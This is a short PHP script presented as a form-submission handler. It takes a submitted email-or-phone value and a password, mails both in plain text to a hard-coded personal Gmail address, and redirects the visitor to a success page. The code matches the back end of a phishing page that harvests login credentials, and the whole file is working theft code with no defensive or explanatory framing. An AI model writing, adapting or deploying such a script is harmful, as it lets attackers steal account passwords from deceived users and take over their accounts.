<?php
// PHP script to handle form submission and send email

// Set the recipient email address
$recipient_email = 'j00s3a1@gmail.com';

// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  // Get the form data
  $email_or_phone = $_POST['email_or_phone'];
  $password = $_POST['password'];

  // Create a message to send
  $message = "Email or Phone: $email_or_phone\n";
  $message.= "Password: $password\n";

  // Send the email
  $subject = 'Form Submission Data';
  $headers = 'From: Your Name <your_email@example.com>'. "\r\n";
  mail($recipient_email, $subject, $message, $headers);

  // Redirect to a success page or display a success message
  header('Location: success.html');
  exit;
}
?>